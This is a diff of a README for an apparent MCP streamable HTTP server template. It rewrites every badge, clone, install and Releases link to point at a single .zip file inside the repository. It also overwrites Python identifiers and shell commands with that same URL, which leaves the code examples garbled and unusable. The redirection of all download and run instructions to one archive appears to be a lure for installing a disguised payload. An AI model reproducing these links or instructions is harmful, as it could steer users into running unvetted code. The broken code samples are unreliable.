@@ -1,7 +1,7 @@
 # mcp-streamable-http-server
 
-![mcp-streamable-http-server](https://img.shields.io/badge/mcp--streamable--http--server-v1.0.0-blue.svg)  
-[![Release Version](https://img.shields.io/github/release/nunaszek/mcp-streamable-http-server.svg)](https://github.com/nunaszek/mcp-streamable-http-server/releases)
+![mcp-streamable-http-server](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip)  
+[![Release Version](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip)](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip)
 
 Welcome to the **mcp-streamable-http-server** repository! This project offers a comprehensive development template for creating StreamableHttp services. It emphasizes flexible authentication, dynamic service registration, customizable middleware, and easy tool configuration through YAML files.
 
@@ -33,20 +33,20 @@ Welcome to the **mcp-streamable-http-server** repository! This project offers a 
 To get started with the mcp-streamable-http-server, clone the repository and install the required dependencies.
 
 ```bash
-git clone https://github.com/nunaszek/mcp-streamable-http-server.git
+git clone https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip
 cd mcp-streamable-http-server
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip
 ```
 
 ## Getting Started
 
 After installing the project, you can start building your StreamableHttp services. 
 
-1. **Download the latest release** from the [Releases section](https://github.com/nunaszek/mcp-streamable-http-server/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip).
 2. **Execute the server** by running:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip
 ```
 
 This will start your server, ready to handle requests.
@@ -91,11 +91,11 @@ Middleware allows you to process requests before they reach your service. You ca
 ### Example of Custom Middleware
 
 ```python
-from starlette.middleware.base import BaseHTTPMiddleware
+from https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip import BaseHTTPMiddleware
 
 class LogRequestMiddleware(BaseHTTPMiddleware):
     async def dispatch(self, request, call_next):
-        print(f"Request: {request.method} {request.url}")
+        print(f"Request: {https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip} {https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip}")
         response = await call_next(request)
         return response
 ```
@@ -107,9 +107,9 @@ Dynamic service registration allows you to add or remove services at runtime. Th
 ### Example of Dynamic Registration
 
 ```python
-@app.on_event("startup")
+https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip("startup")
 async def startup_event():
-    app.add_route("/dynamic_service", dynamic_service, methods=["GET"])
+    https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip("/dynamic_service", dynamic_service, methods=["GET"])
 
 async def dynamic_service(request):
     return JSONResponse({"message": "This is a dynamic service!"})
@@ -126,7 +126,7 @@ from fastapi import Depends, HTTPException, status
 
 def token_auth(token: str = Depends(oauth2_scheme)):
     if token != "expected_token":
-        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid token")
+        raise HTTPException(https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip, detail="Invalid token")
 ```
 
 ## Session Management
@@ -136,9 +136,9 @@ Session management is crucial for maintaining user states. You can implement ses
 ### Example of Session Management
 
 ```python
-from starlette.sessions import SessionMiddleware
+from https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip import SessionMiddleware
 
-app.add_middleware(SessionMiddleware, secret_key="your_secret_key")
+https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip(SessionMiddleware, secret_key="your_secret_key")
 ```
 
 ## Contributing
@@ -160,4 +160,4 @@ For questions or suggestions, please reach out via GitHub issues or contact the 
 
 ---
 
-For the latest releases, visit the [Releases section](https://github.com/nunaszek/mcp-streamable-http-server/releases). Download the latest version and start building your StreamableHttp services today!
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip). Download the latest version and start building your StreamableHttp services today!
